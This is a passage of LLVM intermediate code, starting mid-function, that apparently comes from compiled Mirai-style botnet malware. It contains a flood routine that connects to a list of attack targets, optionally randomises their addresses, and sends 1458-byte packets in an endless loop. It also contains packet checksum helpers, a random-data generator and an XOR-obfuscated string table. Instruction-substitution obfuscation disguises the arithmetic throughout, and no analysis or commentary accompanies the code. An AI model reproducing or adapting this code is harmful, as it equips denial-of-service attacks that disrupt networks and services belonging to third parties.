  br i1 %114, label %115, label %116

; <label>:115:                                    ; preds = %98
  br label %116

; <label>:116:                                    ; preds = %115, %98
  %117 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %118 = load i32, i32* %9, align 4
  %119 = sext i32 %118 to i64
  %120 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %117, i64 %119
  %121 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %120, i32 0, i32 2
  %122 = load i8, i8* %121, align 4
  %123 = zext i8 %122 to i32
  %124 = icmp slt i32 %123, 32
  br i1 %124, label %125, label %155

; <label>:125:                                    ; preds = %116
  %126 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %127 = load i32, i32* %9, align 4
  %128 = sext i32 %127 to i64
  %129 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %126, i64 %128
  %130 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %129, i32 0, i32 1
  %131 = load i32, i32* %130, align 4
  %132 = call i32 @ntohl(i32 %131) #8
  %133 = call i32 @rand_next()
  %134 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %135 = load i32, i32* %9, align 4
  %136 = sext i32 %135 to i64
  %137 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %134, i64 %136
  %138 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %137, i32 0, i32 2
  %139 = load i8, i8* %138, align 4
  %140 = zext i8 %139 to i32
  %141 = lshr i32 %133, %140
  %142 = sub i32 0, %132
  %143 = sub i32 0, %141
  %144 = add i32 %142, %143
  %145 = sub i32 0, %144
  %146 = add i32 %132, %141
  %147 = call i32 @htonl(i32 %145) #8
  %148 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %149 = load i32, i32* %9, align 4
  %150 = sext i32 %149 to i64
  %151 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %148, i64 %150
  %152 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %151, i32 0, i32 0
  %153 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %152, i32 0, i32 2
  %154 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %153, i32 0, i32 0
  store i32 %147, i32* %154, align 4
  br label %155

; <label>:155:                                    ; preds = %125, %116
  %156 = load i32*, i32** %11, align 8
  %157 = load i32, i32* %9, align 4
  %158 = sext i32 %157 to i64
  %159 = getelementptr inbounds i32, i32* %156, i64 %158
  %160 = load i32, i32* %159, align 4
  %161 = bitcast %union.__CONST_SOCKADDR_ARG* %21 to %struct.sockaddr**
  %162 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %163 = load i32, i32* %9, align 4
  %164 = sext i32 %163 to i64
  %165 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %162, i64 %164
  %166 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %165, i32 0, i32 0
  %167 = bitcast %struct.sockaddr_in* %166 to %struct.sockaddr*
  store %struct.sockaddr* %167, %struct.sockaddr** %161, align 8
  %168 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %21, i32 0, i32 0
  %169 = load %struct.sockaddr*, %struct.sockaddr** %168, align 8
  %170 = call i32 @connect(i32 %160, %struct.sockaddr* %169, i32 16)
  %171 = icmp eq i32 %170, -1
  br i1 %171, label %172, label %173

; <label>:172:                                    ; preds = %155
  br label %173

; <label>:173:                                    ; preds = %172, %155
  br label %174

; <label>:174:                                    ; preds = %173
  %175 = load i32, i32* %9, align 4
  %176 = add i32 %175, -235072213
  %177 = add i32 %176, 1
  %178 = sub i32 %177, -235072213
  %179 = add nsw i32 %175, 1
  store i32 %178, i32* %9, align 4
  br label %58

; <label>:180:                                    ; preds = %58
  br label %181

; <label>:181:                                    ; preds = %213, %180
  store i32 0, i32* %9, align 4
  br label %182

; <label>:182:                                    ; preds = %206, %181
  %183 = load i32, i32* %9, align 4
  %184 = load i8, i8* %5, align 1
  %185 = zext i8 %184 to i32
  %186 = icmp slt i32 %183, %185
  br i1 %186, label %187, label %213

; <label>:187:                                    ; preds = %182
  %188 = load i8**, i8*** %10, align 8
  %189 = load i32, i32* %9, align 4
  %190 = sext i32 %189 to i64
  %191 = getelementptr inbounds i8*, i8** %188, i64 %190
  %192 = load i8*, i8** %191, align 8
  store i8* %192, i8** %22, align 8
  %193 = load i8, i8* %15, align 1
  %194 = icmp ne i8 %193, 0
  br i1 %194, label %195, label %199

; <label>:195:                                    ; preds = %187
  %196 = load i8*, i8** %22, align 8
  %197 = load i16, i16* %14, align 2
  %198 = zext i16 %197 to i32
  call void @rand_str(i8* %196, i32 %198)
  br label %199

; <label>:199:                                    ; preds = %195, %187
  %200 = load i32*, i32** %11, align 8
  %201 = load i32, i32* %9, align 4
  %202 = sext i32 %201 to i64
  %203 = getelementptr inbounds i32, i32* %200, i64 %202
  %204 = load i32, i32* %203, align 4
  %205 = call i64 @send(i32 %204, i8* getelementptr inbounds ([1021 x i8], [1021 x i8]* @.str, i32 0, i32 0), i64 1458, i32 16384)
  br label %206

; <label>:206:                                    ; preds = %199
  %207 = load i32, i32* %9, align 4
  %208 = sub i32 0, %207
  %209 = sub i32 0, 1
  %210 = add i32 %208, %209
  %211 = sub i32 0, %210
  %212 = add nsw i32 %207, 1
  store i32 %211, i32* %9, align 4
  br label %182

; <label>:213:                                    ; preds = %182
  br label %181
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @checksum_generic(i16*, i32) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  store i64 0, i64* %5, align 8
  br label %6

; <label>:6:                                      ; preds = %19, %2
  %7 = load i32, i32* %4, align 4
  %8 = icmp ugt i32 %7, 1
  br i1 %8, label %9, label %25

; <label>:9:                                      ; preds = %6
  %10 = load i16*, i16** %3, align 8
  %11 = getelementptr inbounds i16, i16* %10, i32 1
  store i16* %11, i16** %3, align 8
  %12 = load i16, i16* %10, align 2
  %13 = zext i16 %12 to i64
  %14 = load i64, i64* %5, align 8
  %15 = sub i64 %14, -2006664727253897919
  %16 = add i64 %15, %13
  %17 = add i64 %16, -2006664727253897919
  %18 = add i64 %14, %13
  store i64 %17, i64* %5, align 8
  br label %19

; <label>:19:                                     ; preds = %9
  %20 = load i32, i32* %4, align 4
  %21 = add i32 %20, -2075839978
  %22 = sub i32 %21, 2
  %23 = sub i32 %22, -2075839978
  %24 = sub i32 %20, 2
  store i32 %23, i32* %4, align 4
  br label %6

; <label>:25:                                     ; preds = %6
  %26 = load i32, i32* %4, align 4
  %27 = icmp eq i32 %26, 1
  br i1 %27, label %28, label %38

; <label>:28:                                     ; preds = %25
  %29 = load i16*, i16** %3, align 8
  %30 = load i16, i16* %29, align 2
  %31 = trunc i16 %30 to i8
  %32 = sext i8 %31 to i64
  %33 = load i64, i64* %5, align 8
  %34 = add i64 %33, 5812398855497839094
  %35 = add i64 %34, %32
  %36 = sub i64 %35, 5812398855497839094
  %37 = add i64 %33, %32
  store i64 %36, i64* %5, align 8
  br label %38

; <label>:38:                                     ; preds = %28, %25
  %39 = load i64, i64* %5, align 8
  %40 = lshr i64 %39, 16
  %41 = load i64, i64* %5, align 8
  %42 = xor i64 %41, -1
  %43 = xor i64 65535, -1
  %44 = xor i64 -3906913634299171211, -1
  %45 = or i64 %42, %43
  %46 = or i64 -3906913634299171211, %44
  %47 = xor i64 %45, -1
  %48 = and i64 %47, %46
  %49 = and i64 %41, 65535
  %50 = sub i64 %40, 5205035815280203439
  %51 = add i64 %50, %48
  %52 = add i64 %51, 5205035815280203439
  %53 = add i64 %40, %48
  store i64 %52, i64* %5, align 8
  %54 = load i64, i64* %5, align 8
  %55 = lshr i64 %54, 16
  %56 = load i64, i64* %5, align 8
  %57 = sub i64 %56, 1076979409558178429
  %58 = add i64 %57, %55
  %59 = add i64 %58, 1076979409558178429
  %60 = add i64 %56, %55
  store i64 %59, i64* %5, align 8
  %61 = load i64, i64* %5, align 8
  %62 = xor i64 %61, -1
  %63 = and i64 -1497084538662195082, %62
  %64 = xor i64 -1497084538662195082, -1
  %65 = and i64 %61, %64
  %66 = xor i64 -1, -1
  %67 = and i64 %66, -1497084538662195082
  %68 = and i64 -1, %64
  %69 = or i64 %63, %65
  %70 = or i64 %67, %68
  %71 = xor i64 %69, %70
  %72 = xor i64 %61, -1
  %73 = trunc i64 %71 to i16
  ret i16 %73
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @checksum_tcpudp(%struct.iphdr*, i8*, i16 zeroext, i32) #0 {
  %5 = alloca %struct.iphdr*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i16, align 2
  %8 = alloca i32, align 4
  %9 = alloca i16*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %5, align 8
  store i8* %1, i8** %6, align 8
  store i16 %2, i16* %7, align 2
  store i32 %3, i32* %8, align 4
  %14 = load i8*, i8** %6, align 8
  %15 = bitcast i8* %14 to i16*
  store i16* %15, i16** %9, align 8
  %16 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %17 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %16, i32 0, i32 8
  %18 = load i32, i32* %17, align 4
  store i32 %18, i32* %10, align 4
  %19 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %20 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %19, i32 0, i32 9
  %21 = load i32, i32* %20, align 4
  store i32 %21, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %22 = load i32, i32* %8, align 4
  store i32 %22, i32* %13, align 4
  br label %23

; <label>:23:                                     ; preds = %26, %4
  %24 = load i32, i32* %8, align 4
  %25 = icmp sgt i32 %24, 1
  br i1 %25, label %26, label %41

; <label>:26:                                     ; preds = %23
  %27 = load i16*, i16** %9, align 8
  %28 = load i16, i16* %27, align 2
  %29 = zext i16 %28 to i32
  %30 = load i32, i32* %12, align 4
  %31 = sub i32 0, %29
  %32 = sub i32 %30, %31
  %33 = add i32 %30, %29
  store i32 %32, i32* %12, align 4
  %34 = load i16*, i16** %9, align 8
  %35 = getelementptr inbounds i16, i16* %34, i32 1
  store i16* %35, i16** %9, align 8
  %36 = load i32, i32* %8, align 4
  %37 = sub i32 %36, 73424419
  %38 = sub i32 %37, 2
  %39 = add i32 %38, 73424419
  %40 = sub nsw i32 %36, 2
  store i32 %39, i32* %8, align 4
  br label %23

; <label>:41:                                     ; preds = %23
  %42 = load i32, i32* %8, align 4
  %43 = icmp eq i32 %42, 1
  br i1 %43, label %44, label %54

; <label>:44:                                     ; preds = %41
  %45 = load i16*, i16** %9, align 8
  %46 = bitcast i16* %45 to i8*
  %47 = load i8, i8* %46, align 1
  %48 = zext i8 %47 to i32
  %49 = load i32, i32* %12, align 4
  %50 = add i32 %49, 1358984807
  %51 = add i32 %50, %48
  %52 = sub i32 %51, 1358984807
  %53 = add i32 %49, %48
  store i32 %52, i32* %12, align 4
  br label %54

; <label>:54:                                     ; preds = %44, %41
  %55 = load i32, i32* %10, align 4
  %56 = lshr i32 %55, 16
  %57 = xor i32 %56, -1
  %58 = xor i32 65535, -1
  %59 = xor i32 -770628440, -1
  %60 = or i32 %57, %58
  %61 = or i32 -770628440, %59
  %62 = xor i32 %60, -1
  %63 = and i32 %62, %61
  %64 = and i32 %56, 65535
  %65 = load i32, i32* %12, align 4
  %66 = sub i32 %65, 1913410400
  %67 = add i32 %66, %63
  %68 = add i32 %67, 1913410400
  %69 = add i32 %65, %63
  store i32 %68, i32* %12, align 4
  %70 = load i32, i32* %10, align 4
  %71 = xor i32 %70, -1
  %72 = xor i32 65535, -1
  %73 = xor i32 328155187, -1
  %74 = or i32 %71, %72
  %75 = or i32 328155187, %73
  %76 = xor i32 %74, -1
  %77 = and i32 %76, %75
  %78 = and i32 %70, 65535
  %79 = load i32, i32* %12, align 4
  %80 = sub i32 0, %77
  %81 = sub i32 %79, %80
  %82 = add i32 %79, %77
  store i32 %81, i32* %12, align 4
  %83 = load i32, i32* %11, align 4
  %84 = lshr i32 %83, 16
  %85 = xor i32 %84, -1
  %86 = xor i32 65535, -1
  %87 = xor i32 -1162168237, -1
  %88 = or i32 %85, %86
  %89 = or i32 -1162168237, %87
  %90 = xor i32 %88, -1
  %91 = and i32 %90, %89
  %92 = and i32 %84, 65535
  %93 = load i32, i32* %12, align 4
  %94 = sub i32 0, %93
  %95 = sub i32 0, %91
  %96 = add i32 %94, %95
  %97 = sub i32 0, %96
  %98 = add i32 %93, %91
  store i32 %97, i32* %12, align 4
  %99 = load i32, i32* %11, align 4
  %100 = xor i32 %99, -1
  %101 = xor i32 65535, -1
  %102 = xor i32 2030259617, -1
  %103 = or i32 %100, %101
  %104 = or i32 2030259617, %102
  %105 = xor i32 %103, -1
  %106 = and i32 %105, %104
  %107 = and i32 %99, 65535
  %108 = load i32, i32* %12, align 4
  %109 = sub i32 0, %108
  %110 = sub i32 0, %106
  %111 = add i32 %109, %110
  %112 = sub i32 0, %111
  %113 = add i32 %108, %106
  store i32 %112, i32* %12, align 4
  %114 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %115 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %114, i32 0, i32 6
  %116 = load i8, i8* %115, align 1
  %117 = zext i8 %116 to i16
  %118 = call zeroext i16 @htons(i16 zeroext %117) #8
  %119 = zext i16 %118 to i32
  %120 = load i32, i32* %12, align 4
  %121 = add i32 %120, -1502420882
  %122 = add i32 %121, %119
  %123 = sub i32 %122, -1502420882
  %124 = add i32 %120, %119
  store i32 %123, i32* %12, align 4
  %125 = load i16, i16* %7, align 2
  %126 = zext i16 %125 to i32
  %127 = load i32, i32* %12, align 4
  %128 = sub i32 0, %126
  %129 = sub i32 %127, %128
  %130 = add i32 %127, %126
  store i32 %129, i32* %12, align 4
  br label %131

; <label>:131:                                    ; preds = %135, %54
  %132 = load i32, i32* %12, align 4
  %133 = lshr i32 %132, 16
  %134 = icmp ne i32 %133, 0
  br i1 %134, label %135, label %150

; <label>:135:                                    ; preds = %131
  %136 = load i32, i32* %12, align 4
  %137 = xor i32 %136, -1
  %138 = xor i32 65535, -1
  %139 = xor i32 1584964028, -1
  %140 = or i32 %137, %138
  %141 = or i32 1584964028, %139
  %142 = xor i32 %140, -1
  %143 = and i32 %142, %141
  %144 = and i32 %136, 65535
  %145 = load i32, i32* %12, align 4
  %146 = lshr i32 %145, 16
  %147 = sub i32 0, %146
  %148 = sub i32 %143, %147
  %149 = add i32 %143, %146
  store i32 %148, i32* %12, align 4
  br label %131

; <label>:150:                                    ; preds = %131
  %151 = load i32, i32* %12, align 4
  %152 = xor i32 %151, -1
  %153 = and i32 -1, %152
  %154 = xor i32 -1, -1
  %155 = and i32 %151, %154
  %156 = or i32 %153, %155
  %157 = xor i32 %151, -1
  %158 = trunc i32 %156 to i16
  ret i16 %158
}

; Function Attrs: noinline nounwind uwtable
define i32 @rand_next() #0 {
  %1 = alloca i32, align 4
  %2 = load i32, i32* @x, align 4
  store i32 %2, i32* %1, align 4
  %3 = load i32, i32* %1, align 4
  %4 = shl i32 %3, 11
  %5 = load i32, i32* %1, align 4
  %6 = xor i32 %5, -1
  %7 = and i32 %4, %6
  %8 = xor i32 %4, -1
  %9 = and i32 %5, %8
  %10 = or i32 %7, %9
  %11 = xor i32 %5, %4
  store i32 %10, i32* %1, align 4
  %12 = load i32, i32* %1, align 4
  %13 = lshr i32 %12, 8
  %14 = load i32, i32* %1, align 4
  %15 = xor i32 %14, -1
  %16 = and i32 %13, %15
  %17 = xor i32 %13, -1
  %18 = and i32 %14, %17
  %19 = or i32 %16, %18
  %20 = xor i32 %14, %13
  store i32 %19, i32* %1, align 4
  %21 = load i32, i32* @y, align 4
  store i32 %21, i32* @x, align 4
  %22 = load i32, i32* @z, align 4
  store i32 %22, i32* @y, align 4
  %23 = load i32, i32* @w, align 4
  store i32 %23, i32* @z, align 4
  %24 = load i32, i32* @w, align 4
  %25 = lshr i32 %24, 19
  %26 = load i32, i32* @w, align 4
  %27 = xor i32 %26, -1
  %28 = and i32 490153388, %27
  %29 = xor i32 490153388, -1
  %30 = and i32 %26, %29
  %31 = xor i32 %25, -1
  %32 = and i32 %31, 490153388
  %33 = and i32 %25, %29
  %34 = or i32 %28, %30
  %35 = or i32 %32, %33
  %36 = xor i32 %34, %35
  %37 = xor i32 %26, %25
  store i32 %36, i32* @w, align 4
  %38 = load i32, i32* %1, align 4
  %39 = load i32, i32* @w, align 4
  %40 = xor i32 %39, -1
  %41 = and i32 376866085, %40
  %42 = xor i32 376866085, -1
  %43 = and i32 %39, %42
  %44 = xor i32 %38, -1
  %45 = and i32 %44, 376866085
  %46 = and i32 %38, %42
  %47 = or i32 %41, %43
  %48 = or i32 %45, %46
  %49 = xor i32 %47, %48
  %50 = xor i32 %39, %38
  store i32 %49, i32* @w, align 4
  %51 = load i32, i32* @w, align 4
  ret i32 %51
}

; Function Attrs: noinline nounwind uwtable
define void @rand_str(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  br label %5

; <label>:5:                                      ; preds = %61, %2
  %6 = load i32, i32* %4, align 4
  %7 = icmp sgt i32 %6, 0
  br i1 %7, label %8, label %62

; <label>:8:                                      ; preds = %5
  %9 = load i32, i32* %4, align 4
  %10 = icmp sge i32 %9, 4
  br i1 %10, label %11, label %24

; <label>:11:                                     ; preds = %8
  %12 = call i32 @rand_next()
  %13 = load i8*, i8** %3, align 8
  %14 = bitcast i8* %13 to i32*
  store i32 %12, i32* %14, align 4
  %15 = load i8*, i8** %3, align 8
  %16 = getelementptr inbounds i8, i8* %15, i64 4
  store i8* %16, i8** %3, align 8
  %17 = load i32, i32* %4, align 4
  %18 = sext i32 %17 to i64
  %19 = add i64 %18, -1723450019336517673
  %20 = sub i64 %19, 4
  %21 = sub i64 %20, -1723450019336517673
  %22 = sub i64 %18, 4
  %23 = trunc i64 %21 to i32
  store i32 %23, i32* %4, align 4
  br label %61

; <label>:24:                                     ; preds = %8
  %25 = load i32, i32* %4, align 4
  %26 = icmp sge i32 %25, 2
  br i1 %26, label %27, label %45

; <label>:27:                                     ; preds = %24
  %28 = call i32 @rand_next()
  %29 = xor i32 65535, -1
  %30 = xor i32 %28, %29
  %31 = and i32 %30, %28
  %32 = and i32 %28, 65535
  %33 = trunc i32 %31 to i16
  %34 = load i8*, i8** %3, align 8
  %35 = bitcast i8* %34 to i16*
  store i16 %33, i16* %35, align 2
  %36 = load i8*, i8** %3, align 8
  %37 = getelementptr inbounds i8, i8* %36, i64 2
  store i8* %37, i8** %3, align 8
  %38 = load i32, i32* %4, align 4
  %39 = sext i32 %38 to i64
  %40 = sub i64 %39, -5217810014109636709
  %41 = sub i64 %40, 2
  %42 = add i64 %41, -5217810014109636709
  %43 = sub i64 %39, 2
  %44 = trunc i64 %42 to i32
  store i32 %44, i32* %4, align 4
  br label %60

; <label>:45:                                     ; preds = %24
  %46 = call i32 @rand_next()
  %47 = xor i32 255, -1
  %48 = xor i32 %46, %47
  %49 = and i32 %48, %46
  %50 = and i32 %46, 255
  %51 = trunc i32 %49 to i8
  %52 = load i8*, i8** %3, align 8
  %53 = getelementptr inbounds i8, i8* %52, i32 1
  store i8* %53, i8** %3, align 8
  store i8 %51, i8* %52, align 1
  %54 = load i32, i32* %4, align 4
  %55 = sub i32 0, %54
  %56 = sub i32 0, -1
  %57 = add i32 %55, %56
  %58 = sub i32 0, %57
  %59 = add nsw i32 %54, -1
  store i32 %58, i32* %4, align 4
  br label %60

; <label>:60:                                     ; preds = %45, %27
  br label %61

; <label>:61:                                     ; preds = %60, %11
  br label %5

; <label>:62:                                     ; preds = %5
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @table_unlock_val(i8 zeroext) #0 {
  %2 = alloca i8, align 1
  %3 = alloca %struct.table_value*, align 8
  store i8 %0, i8* %2, align 1
  %4 = load i8, i8* %2, align 1
  %5 = zext i8 %4 to i64
  %6 = getelementptr inbounds [41 x %struct.table_value], [41 x %struct.table_value]* @table, i64 0, i64 %5
  store %struct.table_value* %6, %struct.table_value** %3, align 8
  %7 = load i8, i8* %2, align 1
  call void @toggle_obf(i8 zeroext %7)
  ret void
}

; Function Attrs: noinline nounwind uwtable
define internal void @toggle_obf(i8 zeroext) #0 {
  %2 = alloca i8, align 1
  %3 = alloca i32, align 4
  %4 = alloca %struct.table_value*, align 8
  %5 = alloca i8, align 1
  %6 = alloca i8, align 1
  %7 = alloca i8, align 1
  %8 = alloca i8, align 1
  store i8 %0, i8* %2, align 1
  store i32 0, i32* %3, align 4
  %9 = load i8, i8* %2, align 1
  %10 = zext i8 %9 to i64
  %11 = getelementptr inbounds [41 x %struct.table_value], [41 x %struct.table_value]* @table, i64 0, i64 %10
  store %struct.table_value* %11, %struct.table_value** %4, align 8
  %12 = load i32, i32* @table_key, align 4
  %13 = xor i32 %12, -1
  %14 = xor i32 255, -1
  %15 = xor i32 813976965, -1
  %16 = or i32 %13, %14
  %17 = or i32 813976965, %15
  %18 = xor i32 %16, -1
  %19 = and i32 %18, %17
  %20 = and i32 %12, 255
  %21 = trunc i32 %19 to i8
  store i8 %21, i8* %5, align 1
  %22 = load i32, i32* @table_key, align 4
  %23 = lshr i32 %22, 8
  %24 = xor i32 %23, -1
  %25 = xor i32 255, -1
  %26 = xor i32 1571370216, -1
  %27 = or i32 %24, %25
  %28 = or i32 1571370216, %26
  %29 = xor i32 %27, -1
  %30 = and i32 %29, %28
  %31 = and i32 %23, 255
  %32 = trunc i32 %30 to i8
  store i8 %32, i8* %6, align 1
  %33 = load i32, i32* @table_key, align 4
  %34 = lshr i32 %33, 16
  %35 = xor i32 255, -1
  %36 = xor i32 %34, %35
  %37 = and i32 %36, %34
  %38 = and i32 %34, 255
  %39 = trunc i32 %37 to i8
  store i8 %39, i8* %7, align 1
  %40 = load i32, i32* @table_key, align 4
  %41 = lshr i32 %40, 24
  %42 = xor i32 255, -1
  %43 = xor i32 %41, %42
  %44 = and i32 %43, %41
  %45 = and i32 %41, 255
  %46 = trunc i32 %44 to i8
  store i8 %46, i8* %8, align 1
  store i32 0, i32* %3, align 4
  br label %47

; <label>:47:                                     ; preds = %143, %1
  %48 = load i32, i32* %3, align 4
  %49 = load %struct.table_value*, %struct.table_value** %4, align 8
  %50 = getelementptr inbounds %struct.table_value, %struct.table_value* %49, i32 0, i32 1
  %51 = load i16, i16* %50, align 8
  %52 = zext i16 %51 to i32
  %53 = icmp slt i32 %48, %52
  br i1 %53, label %54, label %149

; <label>:54:                                     ; preds = %47
  %55 = load i8, i8* %5, align 1
  %56 = zext i8 %55 to i32
  %57 = load %struct.table_value*, %struct.table_value** %4, align 8
  %58 = getelementptr inbounds %struct.table_value, %struct.table_value* %57, i32 0, i32 0
  %59 = load i8*, i8** %58, align 8
  %60 = load i32, i32* %3, align 4
  %61 = sext i32 %60 to i64
  %62 = getelementptr inbounds i8, i8* %59, i64 %61
  %63 = load i8, i8* %62, align 1
  %64 = sext i8 %63 to i32
  %65 = xor i32 %64, -1
  %66 = and i32 -579274642, %65
  %67 = xor i32 -579274642, -1
  %68 = and i32 %64, %67
  %69 = xor i32 %56, -1
  %70 = and i32 %69, -579274642
  %71 = and i32 %56, %67
  %72 = or i32 %66, %68
  %73 = or i32 %70, %71
  %74 = xor i32 %72, %73
  %75 = xor i32 %64, %56
  %76 = trunc i32 %74 to i8
  store i8 %76, i8* %62, align 1
  %77 = load i8, i8* %6, align 1
  %78 = zext i8 %77 to i32
  %79 = load %struct.table_value*, %struct.table_value** %4, align 8
  %80 = getelementptr inbounds %struct.table_value, %struct.table_value* %79, i32 0, i32 0
  %81 = load i8*, i8** %80, align 8
  %82 = load i32, i32* %3, align 4
  %83 = sext i32 %82 to i64
  %84 = getelementptr inbounds i8, i8* %81, i64 %83
  %85 = load i8, i8* %84, align 1
  %86 = sext i8 %85 to i32
  %87 = xor i32 %86, -1
  %88 = and i32 1692271141, %87
  %89 = xor i32 1692271141, -1
  %90 = and i32 %86, %89
  %91 = xor i32 %78, -1
  %92 = and i32 %91, 1692271141
  %93 = and i32 %78, %89
  %94 = or i32 %88, %90
  %95 = or i32 %92, %93
  %96 = xor i32 %94, %95
  %97 = xor i32 %86, %78
  %98 = trunc i32 %96 to i8
  store i8 %98, i8* %84, align 1
  %99 = load i8, i8* %7, align 1
  %100 = zext i8 %99 to i32
  %101 = load %struct.table_value*, %struct.table_value** %4, align 8
  %102 = getelementptr inbounds %struct.table_value, %struct.table_value* %101, i32 0, i32 0
  %103 = load i8*, i8** %102, align 8
  %104 = load i32, i32* %3, align 4
  %105 = sext i32 %104 to i64
  %106 = getelementptr inbounds i8, i8* %103, i64 %105
  %107 = load i8, i8* %106, align 1
  %108 = sext i8 %107 to i32
  %109 = xor i32 %108, -1
  %110 = and i32 1473030438, %109
  %111 = xor i32 1473030438, -1
  %112 = and i32 %108, %111
  %113 = xor i32 %100, -1
  %114 = and i32 %113, 1473030438
  %115 = and i32 %100, %111
  %116 = or i32 %110, %112
  %117 = or i32 %114, %115
  %118 = xor i32 %116, %117
  %119 = xor i32 %108, %100
  %120 = trunc i32 %118 to i8
  store i8 %120, i8* %106, align 1
  %121 = load i8, i8* %8, align 1
  %122 = zext i8 %121 to i32
  %123 = load %struct.table_value*, %struct.table_value** %4, align 8
  %124 = getelementptr inbounds %struct.table_value, %struct.table_value* %123, i32 0, i32 0
  %125 = load i8*, i8** %124, align 8
  %126 = load i32, i32* %3, align 4
  %127 = sext i32 %126 to i64
  %128 = getelementptr inbounds i8, i8* %125, i64 %127
  %129 = load i8, i8* %128, align 1
  %130 = sext i8 %129 to i32
  %131 = xor i32 %130, -1
  %132 = and i32 -1589149905, %131
  %133 = xor i32 -1589149905, -1
  %134 = and i32 %130, %133
  %135 = xor i32 %122, -1
  %136 = and i32 %135, -1589149905
  %137 = and i32 %122, %133
  %138 = or i32 %132, %134
  %139 = or i32 %136, %137
  %140 = xor i32 %138, %139
  %141 = xor i32 %130, %122
  %142 = trunc i32 %140 to i8
  store i8 %142, i8* %128, align 1
  br label %143

; <label>:143:                                    ; preds = %54
  %144 = load i32, i32* %3, align 4
  %145 = sub i32 %144, -561242078
  %146 = add i32 %145, 1
  %147 = add i32 %146, -561242078
  %148 = add nsw i32 %144, 1
  store i32 %147, i32* %3, align 4
  br label %47

; <label>:149:                                    ; preds = %47
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i8* @table_retrieve_val(i32, i32*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32*, align 8
  %5 = alloca %struct.table_value*, align 8
  store i32 %0, i32* %3, align 4
  store i32* %1, i32** %4, align 8
  %6 = load i32, i32* %3, align 4
  %7 = sext i32 %6 to i64
  %8 = getelementptr inbounds [41 x %struct.table_value], [41 x %struct.table_value]* @table, i64 0, i64 %7
  store %struct.table_value* %8, %struct.table_value** %5, align 8
  %9 = load i32*, i32** %4, align 8
  %10 = icmp ne i32* %9, null
  br i1 %10, label %11, label %17

; <label>:11:                                     ; preds = %2
  %12 = load %struct.table_value*, %struct.table_value** %5, align 8
  %13 = getelementptr inbounds %struct.table_value, %struct.table_value* %12, i32 0, i32 1
  %14 = load i16, i16* %13, align 8
  %15 = zext i16 %14 to i32
  %16 = load i32*, i32** %4, align 8
  store i32 %15, i32* %16, align 4
  br label %17

; <label>:17:                                     ; preds = %11, %2
  %18 = load %struct.table_value*, %struct.table_value** %5, align 8
  %19 = getelementptr inbounds %struct.table_value, %struct.table_value* %18, i32 0, i32 0
  %20 = load i8*, i8** %19, align 8
  ret i8* %20
}

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
